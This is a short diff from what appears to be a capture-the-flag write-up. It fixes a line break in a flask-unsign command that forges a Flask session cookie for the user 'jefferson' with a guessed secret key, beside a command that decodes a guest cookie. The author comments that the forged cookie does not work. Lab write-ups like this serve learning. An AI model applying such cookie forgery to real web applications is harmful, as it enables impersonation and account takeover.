@@ -36,8 +36,7 @@ Session Manipulation:
 flask-unsign --decode --cookie 'eyJuYW1lIjoiZ3Vlc3QifQ.Zk-_xg.1LzY-qUyYbn726AxGD-YZuBrnts'
 # {'name': 'guest'}
 
-flask-unsign --sign --cookie "{'name': 'jefferson'}" --secret 'THE_REYNOLDS_PAMPHLET-1797082516
-45'
+flask-unsign --sign --cookie "{'name': 'jefferson'}" --secret 'THE_REYNOLDS_PAMPHLET-179708251645'
 # eyJuYW1lIjoiamVmZmVyc29uIn0.Zk_ClQ.7S5B847Pp8I6JgVy7aaiytWQWHc
 # not working ^^
 ```
